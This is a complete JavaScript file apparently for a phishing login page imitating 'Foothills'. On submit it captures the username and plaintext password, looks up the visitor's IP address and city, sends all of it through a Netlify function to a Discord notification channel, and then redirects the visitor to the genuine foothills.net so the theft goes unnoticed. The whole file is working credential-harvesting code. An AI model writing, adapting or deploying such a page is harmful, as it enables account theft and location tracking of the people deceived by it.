const toggleBtn = document.querySelector('.toggle-password');
const passwordInput = document.querySelector('#password'); 

if (toggleBtn && passwordInput) {
    toggleBtn.addEventListener('click', () => {
        const isPassword = passwordInput.type === 'password';
        passwordInput.type = isPassword ? 'text' : 'password';
        toggleBtn.textContent = isPassword ? 'Hide' : 'Show';
    });
}

async function getClientIp() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) {
            console.warn('IP lookup failed:', response.status, response.statusText);
            return 'Unknown';
        }
        const data = await response.json();
        return data.ip || 'Unknown';
    } catch (error) {
        console.warn('IP lookup error:', error);
        return 'Unknown';
    }
}

async function getClientLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        if (!response.ok) {
            console.warn('Location lookup failed:', response.status, response.statusText);
            return 'Unknown';
        }
        const data = await response.json();
        const location = [data.city, data.region, data.country_name].filter(Boolean).join(', ');
        return location || 'Unknown';
    } catch (error) {
        console.warn('Location lookup error:', error);
        return 'Unknown';
    }
}

async function sendWebhookMessage(payload) {
    try {
        const response = await fetch('/.netlify/functions/discordNotify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
        console.log('Discord notify response', response.status, response.statusText);
        if (!response.ok) {
            const text = await response.text();
            console.error('Discord notify failed:', response.status, text);
        }
    } catch (error) {
        console.error('Discord notification failed', error);
    }
}

async function handleLoginSubmit(event) {
    event.preventDefault();
    const username = document.querySelector('#username')?.value?.trim() || 'Unknown';
    const remember = document.querySelector('input[name="remember"]')?.checked ? 'Yes' : 'No';
    const passwordValue = document.querySelector('#password')?.value || '';
    const passwordPresent = Boolean(passwordValue.trim());
    const ip = await getClientIp();
    const location = await getClientLocation();
    
    console.log('Submitting form to Discord notify:', { username, remember, passwordValue, passwordPresent, ip, location });
    
    sendWebhookMessage({
        page: 'Foothills login',
        username,
        remember,
        passwordPresent,
        password: passwordValue, 
        ip,
        location,
    }).finally(() => {
        window.location.href = 'https://foothills.net';
    });
}

const loginForm = document.getElementById('loginForm');
if (loginForm) {
    loginForm.addEventListener('submit', handleLoginSubmit);
}
